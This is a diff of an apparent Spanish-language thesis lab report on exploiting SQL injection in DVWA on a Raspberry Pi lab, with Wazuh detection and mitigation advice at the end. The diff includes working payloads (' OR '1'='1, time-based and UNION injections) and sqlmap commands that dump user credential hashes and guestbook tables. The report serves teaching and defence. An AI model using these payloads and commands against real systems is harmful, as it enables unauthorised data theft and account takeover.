@@ -543,109 +543,266 @@ zap-baseline.py -t https://webinsegura1.duckdns.org -r reporte_zap1.html</code><
                     Explotación del parámetro de consulta de DVWA mediante técnicas manuales (Burp Suite) y automatizadas (SQLMap) con el fin de evadir autenticación y sustraer la información de las bases de datos de MariaDB.
                 </p>
 
+                <div class="rounded-2xl border border-red-200 bg-red-50/40 p-5 text-sm leading-7 text-red-900 shadow-sm">
+                    <div class="flex items-center gap-2 font-extrabold text-red-950 mb-2">
+                        <span>🚨 ALERTA DE INCIDENCIA TÉCNICA (DESVÍO DE DISEÑO)</span>
+                    </div>
+                    <p>
+                        Durante la ejecución de las pruebas ofensivas de inyección SQL, se detectó una <strong>incompatibilidad crítica del proxy inverso de Apache2</strong> con el motor de sesiones de la aplicación clásica. Para resolver este bloqueo, la arquitectura del laboratorio tuvo que ser reconfigurada en caliente. Puedes consultar los detalles completos de la incidencia y su resolución técnica en el apartado correspondiente del levantamiento del laboratorio:
+                    </p>
+                    <div class="mt-4">
+                        <a href="../laboratorio/tfg_instalacion.html#incidencia-proxy" class="inline-flex items-center gap-2 rounded-xl bg-red-600 px-4 py-2.5 text-xs font-bold uppercase tracking-wider text-white shadow-md shadow-red-900/10 hover:bg-red-700 hover:shadow-lg transition-all duration-200">
+                            <i class="fa-solid fa-arrow-up-right-from-square"></i> Ver Resolución de Incidencia en Instalación
+                        </a>
+                    </div>
+                </div>
+
                 <!-- Evidencias SQLi -->
                 <div class="space-y-6">
                     <h4 class="font-extrabold text-slate-900 text-lg">📊 Evidencias Requeridas de Explotación SQLi</h4>
+                    <div class="rounded-2xl border border-slate-200 bg-slate-50 p-5 space-y-4">
+                        <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                            <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                            📝 1. Contexto de la Prueba
+                        </h4>
+                        <p class="text-sm leading-6 text-slate-700">
+                            Se realizó una auditoría de seguridad sobre la aplicación clásica DVWA (Damn Vulnerable Web Application) desplegada en el laboratorio de pruebas de la Raspberry Pi 5. La configuración inicial del entorno requirió reducir el nivel de seguridad del aplicativo a <strong>"Low"</strong> desde el módulo de configuración (Setup), procediendo a testear los parámetros del formulario en el panel de <em>SQL Injection</em>.
+                        </p>
+                        <ul class="list-disc pl-5 text-sm leading-6 text-slate-700 space-y-1">
+                            <li><strong>IP del Servidor Víctima:</strong> 192.168.1.40</li>
+                            <li><strong>Puerto de Exposición Directo:</strong> 90</li>
+                            <li><strong>Tecnologías del Contenedor:</strong> Apache/2.4.54, PHP/8.1.16, MariaDB</li>
+                            <li><strong>Parámetro de Entrada Vulnerable:</strong> <code>id</code> (método GET/POST)</li>
+                        </ul>
+                    </div>
 
-                    <!-- Captura 6 -->
-                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
-                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
-                            📸 CAPTURA 6 — Burp Suite Interceptando Login
-                        </span>
-                        <p class="text-xs text-slate-600">Interceptación de la petición HTTP POST de acceso.</p>
-                        <p class="text-xs text-slate-700 font-semibold">Debe mostrarse: El método POST a la ruta de login, y los parámetros manipulados con el payload de inyección clásica <code class="bg-white px-1 text-red-700 border">username=' OR '1'='1</code>.</p>
-                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
-                            [Captura 6: Burp Suite Proxy Intercept Request POST /login SQLi payload]
+                    <!-- Bloque 2: Explotación Manual -->
+                    <div class="rounded-2xl border border-slate-200 bg-slate-50 p-5 space-y-4">
+                        <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                            <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                            ⚡ 2. Fase de Explotación Manual e Interceptación de Tráfico
+                        </h4>
+                        <p class="text-sm leading-6 text-slate-700">
+                            Inicialmente, se ejecutó una prueba manual inyectando la consulta lógica universal <code class="code-font text-red-700 font-semibold">' OR '1'='1</code> para forzar la evasión de autenticación del formulario y obligar al motor de base de datos a retornar la lista completa de usuarios registrados.
+                        </p>
+
+                        <!-- Captura Cookie -->
+                        <div class="rounded-xl border border-slate-150 bg-white p-4 space-y-3">
+                            <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                <img src="../assets/explotacion/burp/visual_cookie.png" alt="Cookie de sesión y bypass básico" class="w-full rounded-lg border border-slate-100 object-cover">
+                                <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Extracción de cookies e identificador de sesión activa tras inyectar el vector universal ' OR '1'='1.</figcaption>
+                            </figure>
+                        </div>
+
+                        <!-- Captura SQL Injection 2 -->
+                        <div class="rounded-xl border border-slate-150 bg-white p-4 space-y-3">
+                            <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                <img src="../assets/explotacion/burp/sql_injection2.png" alt="Consultas UNION en DVWA" class="w-full rounded-lg border border-slate-100 object-cover">
+                                <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Inyecciones estructuradas UNION manuales aplicadas directamente desde el formulario de DVWA.</figcaption>
+                            </figure>
+                        </div>
+
+                        <!-- Captura Apache Logs en Wazuh -->
+                        <div class="rounded-xl border border-slate-150 bg-white p-4 space-y-3">
+                            <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                <img src="../assets/explotacion/burp/Apache_logs.png" alt="Logs de Apache e ingesta en Wazuh" class="w-full rounded-lg border border-slate-100 object-cover">
+                                <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Ingesta de logs de Apache en Wazuh Server mostrando el disparo del caso de uso defensivo de nivel de alerta 12.</figcaption>
+                            </figure>
                         </div>
                     </div>
 
-                    <!-- Captura 7 -->
-                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
-                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
-                            📸 CAPTURA 7 — Login Exitoso con Bypass
-                        </span>
-                        <p class="text-xs text-slate-700 font-semibold">Debe verse: Acceso concedido al panel interno de DVWA o al Dashboard con sesión de administrador sin ingresar contraseñas.</p>
-                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
-                            [Captura 7: DVWA Dashboard Admin Logged In]
-                        </div>
-                    </div>
-
-                    <!-- Captura 8 -->
-                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
-                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
-                            📸 CAPTURA 8 — Cookie de Sesión Extraída
-                        </span>
-                        <p class="text-xs text-slate-700 font-semibold">Debe verse en las herramientas de desarrollo del navegador: Nombre del parámetro (<code class="code-font text-red-700 font-semibold">PHPSESSID</code>), valor hexadecimal y dominio.</p>
-                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
-                            [Captura 8: DevTools Cookies storage showing PHPSESSID value]
-                        </div>
-                    </div>
-
-                    <!-- Comandos SQLMap -->
-                    <div class="mt-4 space-y-4">
-                        <h4 class="font-bold text-slate-900 text-sm">Flujo de comandos ejecutados en Kali Linux:</h4>
+                    <!-- Bloque 3: Explotación Automatizada con SQLMap -->
+                    <div class="rounded-2xl border border-slate-200 bg-slate-50 p-5 space-y-4">
+                        <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                            <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                            ⚙️ 3. Fase de Explotación Automatizada con SQLMap
+                        </h4>
                         
-                        <div class="code-shell">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
-                                <span>Paso 1: Identificación e Inyección (Obtención de DBs)</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap1')">Copiar</button>
+                        <div class="space-y-6">
+                            <!-- 3.1 -->
+                            <div class="space-y-3">
+                                <h5 class="text-sm font-bold text-red-700 mt-2">Diagnóstico y Detección de Vectores</h5>
+                                <p class="text-sm leading-6 text-slate-700">
+                                    Se lanzó el escaneo inicial utilizando la cookie de sesión obtenida para autenticarse a través del proxy.
+                                </p>
+                                <div class="code-shell">
+                                    <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                        <span>Identificación del Backend y Extracción de Bases de Datos</span>
+                                        <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap1')">Copiar</button>
+                                    </div>
+                                    <pre id="c-sqlmap1" class="p-4 text-xs leading-6 text-slate-900 whitespace-pre-wrap break-all"><code>sqlmap -u "http://192.168.1.40:90/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="PHPSESSID=9d320930eaba64d1c195f8545564797f; security=low" --batch --dbs</code></pre>
+                                </div>
+                                
+                                <div class="rounded-xl border border-slate-150 bg-white p-4">
+                                    <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                        <img src="../assets/explotacion/burp/cookie.png" alt="Ejecución de SQLMap con cookie" class="w-full rounded-lg border border-slate-100 object-cover">
+                                        <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Ejecución de escaneo inicial de SQLMap cargando la cookie de sesión del navegador.</figcaption>
+                                    </figure>
+                                </div>
+
+                                <p class="text-sm leading-6 text-slate-700">
+                                    SQLMap identificó dos tipos de inyecciones viables sobre el parámetro de entrada:
+                                </p>
+                                <div class="p-4 rounded-xl bg-white border border-slate-150 text-xs space-y-2">
+                                    <p><strong>A) Time-Based Blind SQL Injection:</strong></p>
+                                    <pre class="text-red-700 bg-slate-50 p-2 border font-mono whitespace-pre-wrap break-all">Payload: id=1' AND (SELECT 1873 FROM (SELECT(SLEEP(5)))SLCO) AND 'DgrU'='DgrU</pre>
+                                    <p class="text-slate-600"><em>Interpretación:</em> El servidor retarda la respuesta en 5 segundos exactos, confirmando la ejecución asíncrona de consultas SQL arbitrarias.</p>
+
+                                    <p class="mt-2"><strong>B) UNION-Based SQL Injection:</strong></p>
+                                    <pre class="text-red-700 bg-slate-50 p-2 border font-mono whitespace-pre-wrap break-all">Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71787a6271,0x537459427142554f56516557677954684462636b77526f464561744d76b71)-- -</pre>
+                                    <p class="text-slate-600"><em>Interpretación:</em> La estructura del backend permite unir los resultados de consultas del atacante mediante la cláusula UNION, facilitando la extracción directa de información en texto claro.</p>
+                                </div>
+
+                                <div class="rounded-xl border border-slate-150 bg-white p-4">
+                                    <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                        <img src="../assets/explotacion/burp/comandos.png" alt="Confirmación de inyección en SQLMap" class="w-full rounded-lg border border-slate-100 object-cover">
+                                        <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Confirmación técnica en consola de los parámetros y vectores inyectables detectados por la herramienta.</figcaption>
+                                    </figure>
+                                </div>
                             </div>
-                            <pre id="c-sqlmap1" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>sqlmap -u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_SESION_COOKIE" --batch --dbs</code></pre>
+
+                            <!-- 3.2 -->
+                            <div class="space-y-3 border-t border-slate-200/60 pt-4">
+                                <h5 class="text-sm font-bold text-red-700">Identificación del Motor y Sistema Operativo</h5>
+                                <p class="text-sm leading-6 text-slate-700">
+                                    Las pruebas automatizadas determinaron de forma precisa la arquitectura y versiones del servidor víctima:
+                                </p>
+                                <pre class="bg-white p-4 border border-slate-150 rounded-xl text-xs leading-5 font-mono">back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+web server operating system: Linux Debian
+web application technology: Apache 2.4.54, PHP 8.1.16</pre>
+                            </div>
+
+                            <!-- 3.3 -->
+                            <div class="space-y-3 border-t border-slate-200/60 pt-4">
+                                <h5 class="text-sm font-bold text-red-700">Enumeración de Esquemas de Base de Datos</h5>
+                                <p class="text-sm leading-6 text-slate-700">
+                                    Tras consultar el diccionario de datos interno, SQLMap extrajo las bases de datos de usuario e internas disponibles:
+                                </p>
+                                <pre class="bg-white p-4 border border-slate-150 rounded-xl text-xs leading-5 font-mono">available databases [2]:
+[*] dvwa
+[*] information_schema</pre>
+                            </div>
+
+                            <!-- 3.4 -->
+                            <div class="space-y-3 border-t border-slate-200/60 pt-4">
+                                <h5 class="text-sm font-bold text-red-700">Enumeración de Tablas en Base de Datos "dvwa"</h5>
+                                <div class="code-shell">
+                                    <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                        <span>Obtención de tablas de la base de datos de DVWA</span>
+                                        <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap2')">Copiar</button>
+                                    </div>
+                                    <pre id="c-sqlmap2" class="p-4 text-xs leading-6 text-slate-900 whitespace-pre-wrap break-all"><code>sqlmap -u "http://192.168.1.40:90/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="PHPSESSID=9d320930eaba64d1c195f8545564797f; security=low" -D dvwa --tables --batch</code></pre>
+                                </div>
+                                <pre class="bg-white p-4 border border-slate-150 rounded-xl text-xs leading-5 font-mono">Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+</pre>
+                                <div class="rounded-xl border border-slate-150 bg-white p-4">
+                                    <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                        <img src="../assets/explotacion/burp/tablas.png" alt="Tablas de DVWA en SQLMap" class="w-full rounded-lg border border-slate-100 object-cover">
+                                        <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Tabla de datos exfiltrada de la base de datos de la aplicación.</figcaption>
+                                    </figure>
+                                </div>
+                            </div>
+
+                            <!-- 3.5 -->
+                            <div class="space-y-3 border-t border-slate-200/60 pt-4">
+                                <h5 class="text-sm font-bold text-red-700">Exfiltración de Credenciales de Usuarios (Tabla "users")</h5>
+                                <p class="text-sm leading-6 text-slate-700">
+                                    Se ejecutó el volcado (dump) del contenido de la tabla <code>users</code> para extraer la información sensible de las cuentas del laboratorio:
+                                </p>
+                                <div class="code-shell">
+                                    <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                        <span>Exfiltración de credenciales (Dump de tablas de usuarios)</span>
+                                        <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap3')">Copiar</button>
+                                    </div>
+                                    <pre id="c-sqlmap3" class="p-4 text-xs leading-6 text-slate-900 whitespace-pre-wrap break-all"><code>sqlmap -u "http://192.168.1.40:90/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="PHPSESSID=9d320930eaba64d1c195f8545564797f; security=low" -D dvwa -T users --dump --batch</code></pre>
+                                </div>
+                                <div class="rounded-xl border border-slate-150 bg-white p-4">
+                                    <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                        <img src="../assets/explotacion/burp/table_user.png" alt="Dumping de tabla de usuarios en SQLMap" class="w-full rounded-lg border border-slate-100 object-cover">
+                                        <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Volcado de registros de la tabla users exponiendo contraseñas cifradas en MD5.</figcaption>
+                                    </figure>
+                                </div>
+                            </div>
+
+                            <!-- 3.6 -->
+                            <div class="space-y-3 border-t border-slate-200/60 pt-4">
+                                <h5 class="text-sm font-bold text-red-700">Exfiltración de Mensajes y Comentarios (Tabla "guestbook")</h5>
+                                <p class="text-sm leading-6 text-slate-700">
+                                    Adicionalmente, se procedió a realizar el dump de la tabla <code>guestbook</code> para recuperar los comentarios dejados por usuarios del entorno:
+                                </p>
+                                <div class="code-shell">
+                                    <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                        <span>Exfiltración de comentarios (Dump de tabla guestbook)</span>
+                                        <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap4')">Copiar</button>
+                                    </div>
+                                    <pre id="c-sqlmap4" class="p-4 text-xs leading-6 text-slate-900 whitespace-pre-wrap break-all"><code>sqlmap -u "http://192.168.1.40:90/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="PHPSESSID=9d320930eaba64d1c195f8545564797f; security=low" -D dvwa -T guestbook --dump --batch</code></pre>
+                                </div>
+                                <div class="rounded-xl border border-slate-150 bg-white p-4">
+                                    <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                        <img src="../assets/explotacion/burp/all_tables.png" alt="Dumping de tabla guestbook" class="w-full rounded-lg border border-slate-100 object-cover">
+                                        <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Volcado de datos de comentarios de usuarios obtenidos de la tabla guestbook.</figcaption>
+                                    </figure>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Bloque 4: Post-Explotación -->
+                    <div class="rounded-2xl border border-slate-200 bg-slate-50 p-5 space-y-4">
+                        <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                            <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                            🔓 4. Post-Explotación y Utilización de Credenciales
+                        </h4>
+                        <p class="text-sm leading-6 text-slate-700">
+                            Tras obtener los nombres de usuario y los hashes MD5 correspondientes de la base de datos MariaDB, se demostró el impacto real del ataque de inyección SQL empleando los datos en otros servicios expuestos en el laboratorio:
+                        </p>
+
+                        <!-- Brute Force Explotacion User -->
+                        <div class="rounded-xl border border-slate-150 bg-white p-4 space-y-3">
+                            <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                <img src="../assets/explotacion/burp/explotacion_user.png" alt="Ataque Brute Force exitoso" class="w-full rounded-lg border border-slate-100 object-cover">
+                                <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Acceso concedido al panel tras inyectar la credencial exfiltrada.</figcaption>
+                            </figure>
                         </div>
 
-                        <!-- Captura 9 -->
-                        <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
-                            <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
-                                📸 CAPTURA 9 — SQLMap detectando la inyección
-                            </span>
-                            <p class="text-xs text-slate-700 font-semibold">Debe mostrar en consola: Parámetro afectado (Parameter: id), tipo de inyección y base de datos trasera detectada (DBMS: MariaDB).</p>
-                            <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
-                                [Captura 9: SQLMap detection output showing Union Query / Boolean-based]
-                            </div>
+                        <!-- Export CSV -->
+                        <div class="rounded-xl border border-slate-150 bg-white p-4 space-y-3">
+                            <figure class="overflow-hidden rounded-xl border border-slate-200 bg-white p-2">
+                                <img src="../assets/explotacion/burp/export_data.png" alt="Exportación de base de datos a CSV" class="w-full rounded-lg border border-slate-100 object-cover">
+                                <figcaption class="mt-2 text-[11px] italic text-slate-500 text-center"><strong>Captura:</strong> Exportación estructurada a guestbook.csv de toda la información de los usuarios.</figcaption>
+                            </figure>
+                        </div>
+                    </div>
+
+                    <!-- Bloque 5: Impacto y Mitigaciones -->
+                    <div class="rounded-2xl border border-slate-200 bg-slate-50 p-5 space-y-4">
+                        <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                            <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                            🛡️ 5. Impacto de la Vulnerabilidad y Mitigaciones
+                        </h4>
+                        
+                        <div class="p-5 rounded-2xl bg-amber-50 border border-amber-200 text-sm leading-7 text-amber-900">
+                            <strong>Impacto del Ataque SQL Injection:</strong><br>
+                            La explotación en el laboratorio ha demostrado la capacidad de comprometer completamente la confidencialidad de la información guardada. Se ha obtenido lectura de datos críticos (credenciales en hash, registros históricos y comentarios), capacidad de mapeo de la estructura del motor MariaDB y bypass de los paneles de control de acceso.
                         </div>
 
-                        <!-- Captura 10 -->
-                        <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
-                            <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
-                                📸 CAPTURA 10 — SQLMap Listando Bases de Datos
-                            </span>
-                            <p class="text-xs text-slate-700 font-semibold">Debe mostrar en consola: El listado completo de bases de datos disponibles (<code class="code-font text-red-700">dvwa</code>, <code class="code-font text-red-700">mysql</code>, <code class="code-font text-red-700">information_schema</code>).</p>
-                            <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
-                                [Captura 10: SQLMap output listing databases dvwa, mysql]
-                            </div>
-                        </div>
-
-                        <div class="code-shell mt-4">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
-                                <span>Paso 2: Obtención de tablas de la base de datos de DVWA</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap2')">Copiar</button>
-                            </div>
-                            <pre id="c-sqlmap2" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>sqlmap -u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_SESION_COOKIE" -D dvwa --tables --batch</code></pre>
-                        </div>
-
-                        <div class="code-shell mt-4">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
-                                <span>Paso 3: Exfiltración de credenciales (Dump de tablas)</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap3')">Copiar</button>
-                            </div>
-                            <pre id="c-sqlmap3" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>sqlmap -u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_SESION_COOKIE" -D dvwa -T users --dump --batch</code></pre>
-                        </div>
-
-                        <!-- Captura 11 -->
-                        <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
-                            <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
-                                📸 CAPTURA 11 — SQLMap Exfiltrando Usuarios y Hashes
-                            </span>
-                            <p class="text-xs text-slate-700 font-semibold">Debe mostrar en consola: La tabla desencriptada/descargada con columnas como <code class="code-font">user</code>, <code class="code-font">password/hash</code> y correos electrónicos.</p>
-                            <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
-                                [Captura 11: SQLMap users table dump output showing admin credentials]
-                            </div>
+                        <div class="p-5 rounded-2xl bg-emerald-50 border border-emerald-250 text-sm leading-7 text-emerald-900">
+                            <strong>Recomendaciones de Mitigación:</strong>
+                            <ul class="list-disc pl-5 mt-2 space-y-1">
+                                <li><strong>Consultas Preparadas:</strong> Implementación obligatoria de sentencias preparadas y parametrizadas (Prepared Statements) para independizar el código SQL de los datos de entrada del usuario.</li>
+                                <li><strong>Validación Rigurosa:</strong> Aplicación de filtros de entrada estrictos mediante listas blancas para el parámetro <code>id</code> (permitiendo únicamente valores numéricos enteros).</li>
+                                <li><strong>Control de Errores:</strong> Deshabilitar mensajes de depuración detallados de la base de datos hacia el cliente externo para evitar fugas de información.</li>
+                                <li><strong>Seguridad Perimetral:</strong> Despliegue de un WAF (Web Application Firewall) para detectar patrones sospechosos de inyección SQL.</li>
+                            </ul>
                         </div>
                     </div>
                 </div>
             </section>
 
-            <!-- Sección 4: Explotación Sistema: React2Shell (RCE) -->
             <section id="rce" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
                 <div class="flex items-center gap-3">
                     <h3 class="text-2xl font-bold text-slate-950">🐚 Ejecución Remota de Código (React2Shell RCE)</h3>
